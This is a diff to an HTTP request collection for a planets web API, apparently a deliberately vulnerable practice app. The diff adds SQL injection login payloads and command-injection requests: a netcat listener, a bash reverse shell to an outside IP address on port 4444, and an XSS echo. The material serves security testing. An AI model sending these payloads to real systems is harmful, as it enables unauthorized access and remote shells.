@@ -3,12 +3,12 @@
 ###
 # group: Basic
 # @name Insecure Login
-POST http://{{host}}/login
+POST http://{{host}}:{{port}}/login
 Content-Type: application/json
 
 {
   "email": "test@test.com",
-  "password": "' or 1=1;--"
+  "password": "' or 1=1;#"
 }
 
 > {%
@@ -29,11 +29,11 @@ Content-Type: application/json
 ###
 # group: Basic
 # @name Insecure Login 2
-POST http://{{host}}/login
+POST http://{{host}}:{{port}}/login
 Content-Type: application/json
 
 {
-  "email": "' or 1=1;--",
+  "email": "' or 1=1;#",
   "password": ""
 }
 
@@ -55,7 +55,7 @@ Content-Type: application/json
 ###
 # group: Basic
 # @name Login
-POST http://{{host}}/login
+POST http://{{host}}:{{port}}/login
 Content-Type: application/json
 
 {
@@ -84,7 +84,7 @@ Content-Type: application/json
 //< {%
     // TODO: you can add here Pre-request handler
 //%}
-POST http://{{host}}/add_planet
+POST http://{{host}}:{{port}}/add_planet
 Authorization: Bearer {{access_token}}
 Content-Type: multipart/form-data; boundary=WebAppBoundary
 
@@ -123,7 +123,7 @@ Sol
 ###
 # group: Basic
 # @name Add Planet JSON
-POST http://localhost:5000/add_planet
+POST http://{{host}}:{{port}}/add_planet
 Authorization: Bearer {{access_token}}
 Content-Type: application/json
 
@@ -151,7 +151,7 @@ Content-Type: application/json
 //< {%
     // TODO: you can add here Pre-request handler
 //%}
-GET http://{{host}}/planet_details/{{id}}
+GET http://{{host}}:{{port}}/planet_details/{{id}}
 
 > {%
     // TODO: migrate to HTTP Client Response handler API
@@ -162,22 +162,24 @@ GET http://{{host}}/planet_details/{{id}}
 ###
 # group: Basic
 # @name Update Planet
-PUT http://{{host}}/update_planet
+PUT http://{{host}}:{{port}}/update_planet
 Authorization: Bearer {{access_token}}
 Content-Type: application/json
 
-{   "planet_id":{{id}},
-    "planet_name":"Mercury",
-    "planet_type":"Class A",
-        "home_star":"Sol",
-        "mass":2.258e23,
-        "radius":1516,
-        "distance":35.98e6}
+{
+    "planet_id": {{id}},
+    "planet_name": "Mercury",
+    "planet_type": "Class A",
+    "home_star": "Sol",
+    "mass": 2.258e23,
+    "radius": 1516,
+    "distance": 35.98e6
+}
 
 ###
 # group: Basic
 # @name Planets
-GET http://{{host}}/planets
+GET http://{{host}}:{{port}}/planets
 
 > {%
     // TODO: migrate to HTTP Client Response handler API
@@ -194,7 +196,7 @@ GET http://{{host}}/planets
 ###
 # group: Basic
 # @name dbsize
-GET http://{{host}}/dbsize/planets.db
+GET http://{{host}}:{{port}}/dbsize/planets.db
 
 > {%
     // TODO: migrate to HTTP Client Response handler API
@@ -207,7 +209,7 @@ GET http://{{host}}/dbsize/planets.db
 ###
 # group: Basic
 # @name Delete Planet
-DELETE http://{{host}}/remove_planet/{{id}}
+DELETE http://{{host}}:{{port}}/remove_planet/{{id}}
 Authorization: Bearer {{access_token}}
 
 > {%
@@ -219,9 +221,22 @@ Authorization: Bearer {{access_token}}
 %}
 
 ###
+# group: Basic
+# @name Forgot Password
+GET http://{{host}}:{{port}}/retrieve_password/{{email}}
+
+> {%
+    // TODO: migrate to HTTP Client Response handler API
+    // pm.test("Status code is 200", function () {
+    //     pm.response.to.have.status(200);
+    // });
+    //
+%}
+
+###
 # group: Negative
 # @name Add Planet Missing Name
-POST http://{{host}}/add_planet
+POST http://{{host}}:{{port}}/add_planet
 Authorization: Bearer {{access_token}}
 Content-Type: multipart/form-data; boundary=WebAppBoundary
 
@@ -266,7 +281,7 @@ Sol
 ###
 # group: Negative
 # @name Add Planet Planet Name Exists
-POST http://localhost:5000/add_planet
+POST http://{{host}}:{{port}}/add_planet
 Authorization: Bearer {{access_token}}
 Content-Type: application/json
 
@@ -294,7 +309,7 @@ Content-Type: application/json
 ###
 # group: Negative
 # @name Login Failure Incorrect Password
-POST http://{{host}}/login
+POST http://{{host}}:{{port}}/login
 Content-Type: application/json
 
 {
@@ -320,7 +335,7 @@ Content-Type: application/json
 ###
 # group: Negative
 # @name Login Failure Incorrect Username
-POST http://{{host}}/login
+POST http://{{host}}:{{port}}/login
 Content-Type: application/json
 
 {
@@ -346,7 +361,7 @@ Content-Type: application/json
 ###
 # group: Negative
 # @name dbsize cmd injection
-GET http://{{host}}/dbsize/planets.db;ls
+GET http://{{host}}:{{port}}/dbsize/planets.db;nc -lnv -p 4444
 
 > {%
     // TODO: migrate to HTTP Client Response handler API
@@ -354,8 +369,32 @@ GET http://{{host}}/dbsize/planets.db;ls
     //     pm.response.to.have.status(400);
     // });
     //
-    // pm.test("Error - CMD Injection", function () {
-    //     var jsonData = pm.response.json();
-    //     pm.expect(jsonData.message).to.eql("Error");
+    //
+%}
+
+###
+# group: Negative
+# @name dbsize cmd injection Bind Shell
+GET http://{{host}}:{{port}}/dbsize/planets.db;/bin/bash -i >& /dev/tcp/80.235.215.60/4444 0>&1
+
+> {%
+    // TODO: migrate to HTTP Client Response handler API
+    // pm.test("Status code is 400 - CMD Injection", function () {
+    //     pm.response.to.have.status(400);
     // });
+    //
+    //
+%}
+
+###
+# group: Negative
+# @name dbsize XSS
+GET http://{{host}}:{{port}}/dbsize/planets.db;echo '<BODY ONLOAD=alert("xss")>'
+
+> {%
+    // TODO: migrate to HTTP Client Response handler API
+    // pm.test("Status code is 200", function () {
+    //     pm.response.to.have.status(200);
+    // });
+    //
 %}
